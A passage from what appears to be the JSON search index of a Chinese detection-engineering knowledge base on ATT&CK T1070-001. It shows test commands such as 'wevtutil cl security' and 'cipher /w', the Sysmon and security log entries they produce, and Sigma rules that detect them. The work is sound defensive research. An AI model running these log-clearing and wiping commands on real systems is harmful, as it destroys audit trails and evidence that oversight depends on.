sysmon","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_3","text":"C:\\Windows\\system32>wevtutil cl security","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_4","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#sysmon_log","text":"Process Create: RuleName: - UtcTime: 2020-11-29 13:15:07.077 ProcessGuid: {bb1f7c32-9edb-5fc3-8100-000000001900} ProcessId: 1908 Image: C:\\Windows\\System32\\wevtutil.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Eventing Command Line Utility Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: wevtutil.exe CommandLine: wevtutil cl security CurrentDirectory: C:\\Windows\\system32\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-7b3c-5fc3-f960-060000000000} LogonId: 0x660f9 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=BDCF4B78B6D6F45EDC9D226CE05B7ADC3B366248 ParentProcessGuid: {bb1f7c32-7b69-5fc3-5000-000000001900} ParentProcessId: 3328 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\"","title":"sysmon_log"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#windows_security_log","text":"\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u4f7f\u7528\u8005: \u5b89\u5168 ID: 12306Br0-PC\\12306Br0 \u5e10\u6237\u540d\u79f0: 12306Br0 \u5e10\u6237\u57df: 12306Br0-PC \u767b\u5f55 ID: 0x660f9 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x774 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\wevtutil.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: TokenElevationTypeFull (2) \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0xd00 \u8fdb\u7a0b\u547d\u4ee4\u884c: #\u672a\u5f00\u542f\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u5ba1\u6838\uff0c\u6240\u4ee5\u6b64\u5904\u4e3a\u7a7a","title":"windows_security_log"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#sigma","text":"title: windows \u65e5\u5fd7\u6e05\u9664 description: win7\u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: security detection: \u200b selection1: \u200b EventID: \u200b - 1 #sysmon \u200b - 4688 #Windows \u5b89\u5168\u65e5\u5fd7 Process.name: 'wevtutil.exe' #Application Name Commanline: 'cl' selection2: Process.name: 'powershell.exe' #Application Name Commanline: 'Clear-EventLog' \u200b condition: selection1 OR selection2 level: medium","title":"sigma"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_6","text":"\u5982\u679c\u4f60\u60f3\u57fa\u4e8ewindows\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\uff0c\u90a3\u4e48\u4f60\u9700\u8981\u7559\u610f\u5728\u4ea7\u751f\u4e861102\uff08\u65e5\u5fd7\u6e05\u9664\uff09\u540e\uff0cwevtutil\u8fdb\u7a0b\uff084688/4689\uff09\u7684\u8c03\u7528\u60c5\u51b5\u3002\u81f3\u5c11\uff0c\u5b83\u5728\u6211\u7684\u6d4b\u8bd5\u73af\u5883\u4e2d\u662f\u8fd9\u4e48\u8868\u73b0\u7684\u3002","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_7","text":"MITRE-ATT&CK-T1070-001 https://attack.mitre.org/techniques/T1070/001/ powershell:Clear-EventLog https://blog.csdn.net/weixin_30800807/article/details/97087311","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/","text":"T1070-001-win-\u68c0\u6d4bcipher.exe\u5220\u9664\u6570\u636e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002 \u5728\u57fa\u4e8e\u7279\u5f81\u76d1\u6d4b\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u963b\u6b62\u76d1\u6d4b\u7279\u5f81\u76f8\u5173\u7684\u6570\u636e\u88ab\u53d1\u9001\u51fa\u53bb\uff0c\u4ee5\u4fbf\u4e8e\u963b\u6b62\u5b89\u5168\u4eba\u5458\u8fdb\u884c\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u6709\u5f88\u591a\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u7684\u8fdb\u7a0b\uff08splunk\u8f6c\u53d1\u5668\u3001Filebate\u3001rsyslog\u7b49\uff09\u3002 \u5728\u6b63\u5e38\u7684\u64cd\u4f5c\u671f\u95f4\u5185\uff0c\u4e8b\u4ef6\u65e5\u5fd7\u4e0d\u592a\u53ef\u80fd\u4f1a\u88ab\u523b\u610f\u6e05\u9664\u3002\u4f46\u662f\u6076\u610f\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u6765\u5c1d\u8bd5\u63a9\u76d6\u81ea\u5df1\u7684\u8e2a\u8ff9\u3002\u5f53\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6e05\u9664\u65f6\uff0c\u5b83\u662f\u53ef\u7591\u7684\u3002\u53d1\u73b0\u201c\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u201d\u65f6\u53ef\u80fd\u610f\u5473\u7740\u6709\u6076\u610f\u653b\u51fb\u8005\u5229\u7528\u4e86\u6b64\u9879\u6280\u672f\u3002 \u96c6\u4e2d\u6536\u96c6\u4e8b\u4ef6\u65e5\u5fd7\u7684\u4e00\u4e2a\u597d\u5904\u5c31\u662f\u4f7f\u653b\u51fb\u8005\u66f4\u96be\u4ee5\u63a9\u76d6\u4ed6\u4eec\u7684\u8e2a\u8ff9\uff0c\u4e8b\u4ef6\u8f6c\u53d1\u5141\u8bb8\u5c06\u6536\u96c6\u5230\u7684\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u53d1\u9001\u7ed9\u591a\u4e2a\u6536\u96c6\u5668\uff08splunk\u3001elk\u7b49\uff09\uff0c\u4ece\u800c\u5b9e\u73b0\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\u3002\u4f7f\u7528\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\uff0c\u53ef\u4ee5\u6700\u5927\u9650\u5ea6\u7684\u5e2e\u52a9\u6211\u4eec\u53d1\u73b0\u5a01\u80c1\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5728windows 2000\u4ee5\u4e0a\u7248\u672c\u90fd\u5185\u7f6e\u4e86\u4e00\u4e2a\u8fd9\u6837\u7684\u5de5\u5177\u2014\u2014cipher.exe\u3002cipher\u4f7f\u7528\u65b9\u6cd5\u5f88\u7b80\u5355\uff0c\u5728\u547d\u4ee4\u884c\u7a97\u53e3\u4e2d\uff0c\u952e\u5165\uff1a cipher /w:\u76d8\u7b26:/\u76ee\u5f55 \u5176\u4e2d\uff0c\u76ee\u5f55\u662f\u53ef\u9009\u7684\uff0c\u7528\u4e8e\u5377\u6302\u63a5\u70b9\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u53ea\u5199\u78c1\u76d8\u76d8\u7b26\u5c31\u884c\u4e86\u3002\u6bd4\u5982\u6e05\u9664e\u76d8\uff0c\u5c31\u7528\u201ccipher /w:e\u201d\u3002 \u547d\u4ee4\u5f00\u59cb\u8fd0\u884c\u540e\uff0c\u4f1a\u4f9d\u6b21\u75280x00\u3001 0xff\u548c\u968f\u610f\u6570\u5b57\u8986\u76d6\u8be5\u5206\u533a\u4e2d\u7684\u5168\u90e8\u7a7a\u95f2\u7a7a\u95f4\uff0c\u80fd\u591f\u6d88\u9664\u4efb\u4f55\u5df2\u5220\u9664\u6587\u4ef6\u7684\u75d5\u8ff9\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6d4b\u8bd5\u73af\u5883\uff1awindows server 2016 \u6d4b\u8bd5\u547d\u4ee4\uff1a C:\\Users\\123>cipher /w:C:/Users/123/Desktop/test \u6d4b\u8bd5\u7559\u75d5 windows_security_log 4688\uff0c\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x507DC \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x11e0 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cipher.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x10f0 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: cipher /w:C:/Users/12306br0/Desktop/test #\u9700\u8981\u5355\u72ec\u914d\u7f6e \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma title: \u68c0\u6d4bcipher.exe\u5220\u9664\u6570\u636e description: windows server 2016\u6a21\u62df\u6d4b\u8bd5\u3002\u8be5\u68c0\u6d4b\u65b9\u5f0f\u6765\u6e90\u4e8eMicrosoft 365 Defender\u5a01\u80c1\u60c5\u62a5\u56e2\u961f\u5a01\u80c1\u5206\u6790\u62a5\u544a\u4e2d\uff0c\u52d2\u7d22\u8f6f\u4ef6\u7ee7\u7eed\u51b2\u51fb\u533b\u7597\u4fdd\u5065\u548c\u5173\u952e\u670d\u52a1\u3002 status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: security detection: \u200b selection: \u200b EventID: \u200b - 1 #sysmon\u65e5\u5fd7 \u200b - 4688 #Windows \u5b89\u5168\u65e5\u5fd7 Process_name: 'cipher.exe' #Application Name Commanline: '/w' \u200b condition: selection level: medium \u5efa\u8bae \u5982\u679c\u57fa\u4e8ewindows\u5b89\u5168\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\uff0c\u9700\u8981\u6ce8\u610f\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u95ee\u9898\uff0c\u90e8\u5206\u64cd\u4f5c\u7cfb\u7edf\u5e76\u4e0d\u652f\u6301\u5f00\u542f\u5ba1\u6838\u8fc7\u7a0b\u521b\u5efa\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1070-001 https://attack.mitre.org/techniques/T1070/001/ \u52d2\u7d22\u8f6f\u4ef6\u7ec4\u7ec7\u7ee7\u7eed\u4ee5\u533b\u7597\u4fdd\u5065\uff0c\u5173\u952e\u670d\u52a1\u4e3a\u76ee\u6807\u2014\u2014Microsoft 365 Defender\u5a01\u80c1\u60c5\u62a5\u56e2\u961f https://www.microsoft.com/security/blog/2020/04/28/ransomware-groups-continue-to-target-healthcare-critical-services-heres-how-to-reduce-risk/","title":"T1070-001-win-\u68c0\u6d4bcipher.exe\u5220\u9664\u6570\u636e"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#t1070-001-win-cipherexe","text":"","title":"T1070-001-win-\u68c0\u6d4bcipher.exe\u5220\u9664\u6570\u636e"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002 \u5728\u57fa\u4e8e\u7279\u5f81\u76d1\u6d4b\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u963b\u6b62\u76d1\u6d4b\u7279\u5f81\u76f8\u5173\u7684\u6570\u636e\u88ab\u53d1\u9001\u51fa\u53bb\uff0c\u4ee5\u4fbf\u4e8e\u963b\u6b62\u5b89\u5168\u4eba\u5458\u8fdb\u884c\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u6709\u5f88\u591a\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u7684\u8fdb\u7a0b\uff08splunk\u8f6c\u53d1\u5668\u3001Filebate\u3001rsyslog\u7b49\uff09\u3002 \u5728\u6b63\u5e38\u7684\u64cd\u4f5c\u671f\u95f4\u5185\uff0c\u4e8b\u4ef6\u65e5\u5fd7\u4e0d\u592a\u53ef\u80fd\u4f1a\u88ab\u523b\u610f\u6e05\u9664\u3002\u4f46\u662f\u6076\u610f\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u6765\u5c1d\u8bd5\u63a9\u76d6\u81ea\u5df1\u7684\u8e2a\u8ff9\u3002\u5f53\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6e05\u9664\u65f6\uff0c\u5b83\u662f\u53ef\u7591\u7684\u3002\u53d1\u73b0\u201c\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u201d\u65f6\u53ef\u80fd\u610f\u5473\u7740\u6709\u6076\u610f\u653b\u51fb\u8005\u5229\u7528\u4e86\u6b64\u9879\u6280\u672f\u3002 \u96c6\u4e2d\u6536\u96c6\u4e8b\u4ef6\u65e5\u5fd7\u7684\u4e00\u4e2a\u597d\u5904\u5c31\u662f\u4f7f\u653b\u51fb\u8005\u66f4\u96be\u4ee5\u63a9\u76d6\u4ed6\u4eec\u7684\u8e2a\u8ff9\uff0c\u4e8b\u4ef6\u8f6c\u53d1\u5141\u8bb8\u5c06\u6536\u96c6\u5230\u7684\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u53d1\u9001\u7ed9\u591a\u4e2a\u6536\u96c6\u5668\uff08splunk\u3001elk\u7b49\uff09\uff0c\u4ece\u800c\u5b9e\u73b0\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\u3002\u4f7f\u7528\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\uff0c\u53ef\u4ee5\u6700\u5927\u9650\u5ea6\u7684\u5e2e\u52a9\u6211\u4eec\u53d1\u73b0\u5a01\u80c1\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_1","text":"\u5728windows 2000\u4ee5\u4e0a\u7248\u672c\u90fd\u5185\u7f6e\u4e86\u4e00\u4e2a\u8fd9\u6837\u7684\u5de5\u5177\u2014\u2014cipher.exe\u3002cipher\u4f7f\u7528\u65b9\u6cd5\u5f88\u7b80\u5355\uff0c\u5728\u547d\u4ee4\u884c\u7a97\u53e3\u4e2d\uff0c\u952e\u5165\uff1a cipher /w:\u76d8\u7b26:/\u76ee\u5f55 \u5176\u4e2d\uff0c\u76ee\u5f55\u662f\u53ef\u9009\u7684\uff0c\u7528\u4e8e\u5377\u6302\u63a5\u70b9\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u53ea\u5199\u78c1\u76d8\u76d8\u7b26\u5c31\u884c\u4e86\u3002\u6bd4\u5982\u6e05\u9664e\u76d8\uff0c\u5c31\u7528\u201ccipher /w:e\u201d\u3002 \u547d\u4ee4\u5f00\u59cb\u8fd0\u884c\u540e\uff0c\u4f1a\u4f9d\u6b21\u75280x00\u3001 0xff\u548c\u968f\u610f\u6570\u5b57\u8986\u76d6\u8be5\u5206\u533a\u4e2d\u7684\u5168\u90e8\u7a7a\u95f2\u7a7a\u95f4\uff0c\u80fd\u591f\u6d88\u9664\u4efb\u4f55\u5df2\u5220\u9664\u6587\u4ef6\u7684\u75d5\u8ff9\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_3","text":"\u6d4b\u8bd5\u73af\u5883\uff1awindows server 2016 \u6d4b\u8bd5\u547d\u4ee4\uff1a C:\\Users\\123>cipher /w:C:/Users/123/Desktop/test","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_4","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#windows_security_log","text":"4688\uff0c\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: 361A\\12306br0 \u5e10\u6237\u540d: 12306br0 \u5e10\u6237\u57df: 361A \u767b\u5f55 ID: 0x507DC \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x11e0 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cipher.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1938 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\Medium Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x10f0 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: cipher /w:C:/Users/12306br0/Desktop/test #\u9700\u8981\u5355\u72ec\u914d\u7f6e","title":"windows_security_log"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#sigma","text":"title: \u68c0\u6d4bcipher.exe\u5220\u9664\u6570\u636e description: windows server 2016\u6a21\u62df\u6d4b\u8bd5\u3002\u8be5\u68c0\u6d4b\u65b9\u5f0f\u6765\u6e90\u4e8eMicrosoft 365 Defender\u5a01\u80c1\u60c5\u62a5\u56e2\u961f\u5a01\u80c1\u5206\u6790\u62a5\u544a\u4e2d\uff0c\u52d2\u7d22\u8f6f\u4ef6\u7ee7\u7eed\u51b2\u51fb\u533b\u7597\u4fdd\u5065\u548c\u5173\u952e\u670d\u52a1\u3002 status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: security detection: \u200b selection: \u200b EventID: \u200b - 1 #sysmon\u65e5\u5fd7 \u200b - 4688 #Windows \u5b89\u5168\u65e5\u5fd7 Process_name: 'cipher.exe' #Application Name Commanline: '/w' \u200b condition: selection level: medium","title":"sigma"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_6","text":"\u5982\u679c\u57fa\u4e8ewindows\u5b89\u5168\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\uff0c\u9700\u8981\u6ce8\u610f\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u95ee\u9898\uff0c\u90e8\u5206\u64cd\u4f5c\u7cfb\u7edf\u5e76\u4e0d\u652f\u6301\u5f00\u542f\u5ba1\u6838\u8fc7\u7a0b\u521b\u5efa\u3002","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%A3%80%E6%B5%8Bcipher.exe%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#_7","text":"MITRE-ATT&CK-T1070-001 https://attack.mitre.org/techniques/T1070/001/ \u52d2\u7d22\u8f6f\u4ef6\u7ec4\u7ec7\u7ee7\u7eed\u4ee5\u533b\u7597\u4fdd\u5065\uff0c\u5173\u952e\u670d\u52a1\u4e3a\u76ee\u6807\u2014\u2014Microsoft 365 Defender\u5a01\u80c1\u60c5\u62a5\u56e2\u961f https://www.microsoft.com/security/blog/2020/04/28/ransomware-groups-continue-to-target-healthcare-critical-services-heres-how-to-reduce-risk/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E6%B8%85%E9%99%A4%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97/","text":"T1070-001-windows-\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002 \u5728\u57fa\u4e8e\u7279\u5f81\u76d1\u6d4b\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u963b\u6b62\u76d1\u6d4b\u7279\u5f81\u76f8\u5173\u7684\u6570\u636e\u88ab\u53d1\u9001\u51fa\u53bb\uff0c\u4ee5\u4fbf\u4e8e\u963b\u6b62\u5b89\u5168\u4eba\u5458\u8fdb\u884c\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u6709\u5f88\u591a\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u7684\u8fdb\u7a0b\uff08splunk\u8f6c\u53d1\u5668\u3001Filebate\u3001rsyslog\u7b49\uff09\u3002 \u5177\u4f53\u6848\u4f8b\uff0c\u4f60\u53ef\u4ee5\u53c2\u8003\u7ed5\u8fc7sysmon\u76f8\u5173\u7684\u6587\u7ae0\u3002\uff08PS\uff1a\u82f1\u8bed\u4e0d\u597d\u3001\u8c37\u6b4c\u7ffb\u8bd1\u771f\u5fc3\uff0c\uff0c\uff0c\u592a\u96be\u4e86\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5728\u6b63\u5e38\u7684\u64cd\u4f5c\u671f\u95f4\u5185\uff0c\u4e8b\u4ef6\u65e5\u5fd7\u4e0d\u592a\u53ef\u80fd\u4f1a\u88ab\u523b\u610f\u6e05\u9664\u3002\u4f46\u662f\u6076\u610f\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u6765\u5c1d\u8bd5\u63a9\u76d6\u81ea\u5df1\u7684\u8e2a\u8ff9\u3002\u5f53\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6e05\u9664\u65f6\uff0c\u5b83\u662f\u53ef\u7591\u7684\u3002\u53d1\u73b0\u201c\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u201d\u65f6\u53ef\u80fd\u610f\u5473\u7740\u6709\u6076\u610f\u653b\u51fb\u8005\u5229\u7528\u4e86\u6b64\u9879\u6280\u672f\u3002 \u96c6\u4e2d\u6536\u96c6\u4e8b\u4ef6\u65e5\u5fd7\u7684\u4e00\u4e2a\u597d\u5904\u5c31\u662f\u4f7f\u653b\u51fb\u8005\u66f4\u96be\u4ee5\u63a9\u76d6\u4ed6\u4eec\u7684\u8e2a\u8ff9\uff0c\u4e8b\u4ef6\u8f6c\u53d1\u5141\u8bb8\u5c06\u6536\u96c6\u5230\u7684\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u53d1\u9001\u7ed9\u591a\u4e2a\u6536\u96c6\u5668\uff08splunk\u3001elk\u7b49\uff09\uff0c\u4ece\u800c\u5b9e\u73b0\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\u3002\u4f7f\u7528\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\uff0c\u53ef\u4ee5\u6700\u5927\u9650\u5ea6\u7684\u5e2e\u52a9\u6211\u4eec\u53d1\u73b0\u5a01\u80c1\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows security windows system \u6d4b\u8bd5\u590d\u73b0 \u8fdb\u5165windows\u4e8b\u4ef6\u67e5\u770b\u5668 